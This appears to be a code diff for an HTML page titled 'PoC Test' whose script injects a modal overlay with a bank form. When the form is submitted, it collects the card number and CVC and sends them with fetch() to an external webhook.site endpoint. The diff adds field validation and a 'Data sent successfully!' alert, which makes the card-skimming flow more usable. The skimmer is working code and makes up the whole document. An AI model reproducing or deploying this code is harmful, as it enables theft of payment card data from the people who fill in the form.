@@ -1,3 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC Test</title>
+</head>
+<body>
+<script>
 (function () {
   const modal = document.createElement('div');
   modal.style.position = 'fixed';
@@ -54,22 +62,35 @@
   modal.appendChild(box);
   document.body.appendChild(modal);
 
-  document.getElementById('bankForm').addEventListener('submit', function (e) {
-    e.preventDefault();
-    const cc = e.target.cc.value;
-    const cvc = e.target.cvc.value;
+  const form = document.getElementById('bankForm');
+  if (form) {
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
 
-    const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;
+      const cc = e.target.cc.value.trim();
+      const cvc = e.target.cvc.value.trim();
 
-    fetch('https://webhook.site/7473ab93-9c6a-4186-97ab-45721d14137b' + queryString)
-      .then(res => res.text())
-      .then(msg => {
-        alert(msg);
-        document.body.removeChild(modal);
-      })
-      .catch(err => {
-        alert('Error submitting data');
-        console.error(err);
-      });
-  });
+      if (!cc || !cvc) {
+        alert('Please fill in all fields');
+        return;
+      }
+
+      const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;
+      const url = 'https://webhook.site/7473ab93-9c6a-4186-97ab-45721d14137b' + queryString;
+
+      fetch(url)
+        .then(res => res.text())
+        .then(msg => {
+          alert('Data sent successfully!');
+          document.body.removeChild(modal);
+        })
+        .catch(err => {
+          alert('Error submitting data');
+          console.error(err);
+        });
+    });
+  }
 })();
+</script>
+</body>
+</html>
